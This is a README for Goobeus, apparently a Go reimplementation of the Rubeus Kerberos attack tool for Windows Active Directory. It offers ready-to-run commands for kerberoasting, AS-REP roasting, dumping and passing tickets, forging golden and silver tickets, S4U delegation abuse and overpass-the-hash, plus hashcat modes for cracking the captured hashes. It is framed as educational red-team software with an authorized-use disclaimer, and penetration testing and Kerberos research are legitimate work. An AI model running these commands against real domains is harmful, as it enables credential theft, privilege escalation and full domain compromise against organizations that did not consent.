# Goobeus

![Goobeus](goobeus.jpg)

A comprehensive Go implementation of [Rubeus](https://github.com/GhostPack/Rubeus) for Kerberos manipulation on Windows.

> **Educational Focus**: Every function includes detailed documentation explaining the underlying Kerberos concepts, RFC references, and security implications. This tool is designed to teach Kerberos while providing red team capabilities.

## Features

| Category | Commands |
|----------|----------|
| **TGT Operations** | `asktgt`, `brute`, `preauthscan` |
| **Service Tickets** | `asktgs`, `tgssub` |
| **Delegation** | `s4u`, `rbcd`, `unconstrained`, `findelegation` |
| **Ticket Management** | `ptt`, `dump`, `triage`, `klist`, `describe`, `purge`, `tgtdeleg`, `monitor`, `harvest` |
| **Forgery** | `golden`, `silver`, `diamond`, `sapphire` |
| **Roasting** | `kerberoast`, `asreproast` |
| **Utilities** | `hash`, `createnetonly`, `changepw`, `currentluid`, `logonsession` |

## Quick Start

### Build

```bash
# Build for Windows
GOOS=windows GOARCH=amd64 go build -o goobeus.exe ./cmd/goobeus
```

### Usage Examples

```bash
# Request TGT with password
goobeus.exe asktgt --domain corp.local --user jsmith --password "Password123!"

# Request TGT with NTLM hash (overpass-the-hash)
goobeus.exe asktgt --domain corp.local --user jsmith --rc4 aad3b435b51404eeaad3b435b51404ee

# Request TGT with AES256 key
goobeus.exe asktgt --domain corp.local --user jsmith --aes256 <key>

# Kerberoast - find and roast all SPNs
goobeus.exe kerberoast --domain corp.local --dc dc01.corp.local

# Kerberoast specific SPN
goobeus.exe kerberoast --domain corp.local --spn MSSQLSvc/sql01.corp.local:1433

# AS-REP Roast
goobeus.exe asreproast --domain corp.local --dc dc01.corp.local

# Dump tickets from current session
goobeus.exe dump

# Dump all tickets (requires elevation)
goobeus.exe dump --all

# Pass-the-ticket
goobeus.exe ptt --ticket ticket.kirbi

# Forge Golden Ticket
goobeus.exe golden --domain corp.local --sid S-1-5-21-... --krbtgt <hash> --user fakeadmin

# Forge Silver Ticket  
goobeus.exe silver --domain corp.local --sid S-1-5-21-... --rc4 <svc_hash> --service cifs/fileserver.corp.local --user admin

# S4U constrained delegation abuse
goobeus.exe s4u --domain corp.local --user svc_sql --rc4 <hash> --impersonate administrator --msdsspn cifs/dc01.corp.local

# Find delegation configurations
goobeus.exe findelegation --domain corp.local --dc dc01.corp.local

# Monitor for new TGTs
goobeus.exe monitor --interval 30s

# Create process with alternate credentials
goobeus.exe createnetonly --program cmd.exe --domain corp.local --user admin --password "Pass123!"
```

## Library Usage

Goobeus is designed as a library first. You can import individual packages:

```go
import (
    "github.com/goobeus/goobeus/pkg/client"
    "github.com/goobeus/goobeus/pkg/ticket"
    "github.com/goobeus/goobeus/pkg/roast"
)

// Request a TGT
result, err := client.AskTGT(&client.TGTRequest{
    Domain:   "corp.local",
    Username: "jsmith",
    Password: "Password123!",
})

// Save as .kirbi
ticket.SaveKirbi(result.Kirbi, "jsmith.kirbi")

// Or convert to .ccache for Linux tools
ticket.SaveCCache(result.CCache, "jsmith.ccache")
```

## Documentation

See the [docs/](docs/) directory for in-depth educational content:

- [KERBEROS_101.md](docs/KERBEROS_101.md) - Kerberos fundamentals
- [ENCRYPTION.md](docs/ENCRYPTION.md) - Encryption types deep dive
- [TICKETS.md](docs/TICKETS.md) - Ticket structure and formats
- [ATTACKS.md](docs/ATTACKS.md) - Attack techniques explained
- [DELEGATION.md](docs/DELEGATION.md) - Delegation abuse

## Credential Formats

| Format | Flag | Example |
|--------|------|---------|
| Password | `--password` | `--password "Pass123!"` |
| NTLM Hash | `--rc4` | `--rc4 aad3b435b51404eeaad3b435b51404ee` |
| AES128 Key | `--aes128` | `--aes128 <32 hex chars>` |
| AES256 Key | `--aes256` | `--aes256 <64 hex chars>` |
| Ticket File | `--ticket` | `--ticket admin.kirbi` |

## Hash Output Formats

Roasting commands support multiple output formats:

```bash
# Hashcat format (default)
goobeus.exe kerberoast --format hashcat

# John the Ripper format
goobeus.exe kerberoast --format john

# All formats at once
goobeus.exe kerberoast --format all
```

Hashcat modes:

- `13100` - Kerberoast RC4
- `19600` - Kerberoast AES128
- `19700` - Kerberoast AES256
- `18200` - AS-REP Roast

## Credits

- [Rubeus](https://github.com/GhostPack/Rubeus) by @harmj0y - Original C# implementation
- [gokrb5](https://github.com/jcmturner/gokrb5) - Go Kerberos library (reference)
- [Impacket](https://github.com/fortra/impacket) - Python Kerberos tools (reference)

## Legal

This tool is intended for authorized security testing and research only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.
